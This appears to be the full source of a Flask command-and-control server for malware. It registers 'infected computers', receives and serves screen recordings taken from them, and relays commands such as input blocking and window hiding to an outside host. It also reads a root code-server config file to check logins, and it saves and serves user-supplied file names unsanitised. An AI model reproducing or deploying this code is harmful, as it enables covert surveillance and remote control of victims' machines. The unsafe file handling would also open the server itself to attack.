import os
import json
import uuid
import requests
from time import time
from flask_cors import CORS
from flask import Flask, send_file, request, redirect, url_for, jsonify

app = Flask(__name__)
CORS(app, supports_credentials=True)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SAVE_DIR = os.path.join(BASE_DIR, 'screen_recordings')

SESSION_DURATION = 3600

messages = []
sessions = {}
screen_recordings = []
infected_computers = []
all_network_passwords = []

def create_session(username):
    session_id = str(uuid.uuid4())
    sessions[session_id] = {
        "expires_at": time() + SESSION_DURATION
    }
    print(f"New session: {session_id}")
    return session_id

def is_session_valid(session_id):
    session = sessions.get(session_id)
    if not session:
        return False
    if time() > session["expires_at"]:
        del sessions[session_id]
        return False
    return True

def remaining_time(session_id):
    return max(0, int(sessions[session_id]["expires_at"] - time()))

@app.route('/', methods=['GET', 'POST'])
def home():
    for computer in infected_computers:
        requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': f'create_shortcut-{computer}'})
    if request.method == 'POST':
        password = request.form.get('password')
        if password == 'nexus':
            return redirect(url_for('success'))
        else:
            return redirect(url_for('failure'))
    return send_file('templates/index.html')
    
@app.route('/flash')
def flash_page():
    return send_file('templates/flash.html')

@app.route('/neutral')
def neutral_page():
    return send_file('templates/neutral.html')

@app.route('/success')
def success():
    for computer in infected_computers:
        requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': f'hidewbcl-{computer}'})
    return send_file('templates/success.html')

@app.route('/failure')
def failure():
    for computer in infected_computers:
        requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': f'blockinput-{computer}'})
        requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': f'hidewbcl-{computer}'})
    return send_file('templates/failure.html')

@app.route('/resources/<path>')
def resources(path):
    return send_file(os.path.join('templates', path))

@app.route('/messages', methods=['POST', 'GET'])
def handle_messages():
    if request.method == 'POST':
        if 'video' in request.files and 'filename' in request.form:
            video = request.files['video']
            filename = request.form['filename']

            filepath = os.path.join(SAVE_DIR, filename)
            video.save(filepath)
            screen_recordings.append(filename)

            requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': 'screen-recording-ready'})
            print("Saved:", filepath)
            return jsonify({'status': 'saved', 'filename': filename})

        message = request.get_json(force=True, silent=True)
        if not message:
            return jsonify({'error': 'no message'}), 400

        action = message.get('action', '')
        data_value = message.get('data', '')

        if message.get('computer_name'):
            computer = message['computer_name'].upper()
            if computer not in infected_computers:
                infected_computers.append(computer)
                print('New Computer:', computer)
        elif message.get('all_computers'):
            print('Computers Requested, returning:', infected_computers)
            return jsonify(infected_computers)
        elif action == 'delete-videos':
            path = os.path.join(os.getcwd(), 'cslckr', 'screen_recordings')
            files = os.listdir(path)
            print(files != [])
            if files != []:
                for filename in files:
                    file_path = os.path.join(path, filename)
                    os.remove(file_path)
            requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': 'delete-video'})
            return {'status': 'no-files-found'}
        elif message.get('verify_creds'):
            creds = message['verify_creds']
            username = creds.get('username')
            password = creds.get('password')

            valid_username = 'mngr'
            password_file = '/root/.config/code-server/config.yaml'

            with open(password_file, 'r') as f:
                for i, line in enumerate(f):
                    if i == 2:
                        valid_password = line.strip().replace('password: ', '').replace("'", "")

            if username == valid_username and password == valid_password:
                session_id = create_session(username)
                return jsonify({
                    "sessionid": session_id,
                    "expires_in": SESSION_DURATION
                })
            else:
                return jsonify({'status': 'incorrect'}), 401
        elif message.get('check_session'):
            session_id = message.get('check_session')
            
            if not is_session_valid(session_id):
                return jsonify({'status': 'not-found'}), 401

            print(f'Session id {session_id} requested with expiry {remaining_time(session_id)}')
            return jsonify({
                'sessionid': session_id,
                'remaining': remaining_time(session_id)
            })
        elif message.get('check_all_sessions'):
            print('All sessions requested, returning:', sessions)
            return jsonify({'all_sessions': sessions})
        elif action.startswith('collect-recorded-'):
            computer = action.replace('collect-recorded-', '')
            requested_time = message.get('time', '')
            if not requested_time:
                return jsonify({'error': 'Missing time for requested recording'}), 400

            filename = f"screen-recording-{computer}-{requested_time}.mp4"
            filepath = os.path.join(SAVE_DIR, filename)
            print("Looking for file:", filepath)
            if not os.path.exists(filepath):
                return jsonify({'error': 'Recording not found'}), 404

            return send_file(filepath, mimetype='video/mp4', as_attachment=False)

        messages.append(message)
        print(f'Stored messages: {message}')
        return jsonify({'status': 'success'})
    elif request.method == 'GET':
        out = messages.copy()
        if out == '[]':
            print(f'Message fetched: {out}')
        messages.clear()
        return jsonify(out)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8003, debug=True)
